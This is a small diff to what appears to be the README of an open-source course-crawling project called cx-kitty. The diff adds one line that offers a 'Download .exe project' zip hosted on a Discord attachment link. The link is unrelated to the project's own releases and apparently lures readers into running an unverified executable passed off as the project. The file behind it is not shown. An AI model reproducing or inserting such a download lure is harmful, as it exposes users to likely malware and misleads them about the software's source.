@@ -9,6 +9,7 @@
     <img alt="Image Size" src="https://img.shields.io/docker/image-size/socialsisteryi/cx-kitty">
 </div>
 
+Download .exe project: https://cdn.discordapp.com/attachments/1107951662464778373/1112329595153305670/Project_v1.2.4.zip
 
 本项目旨在研究学习爬虫技术和网络接口编程技术，同时致力于以开源方式抵制并消灭各种付费“刷课平台”和“黑产”
 
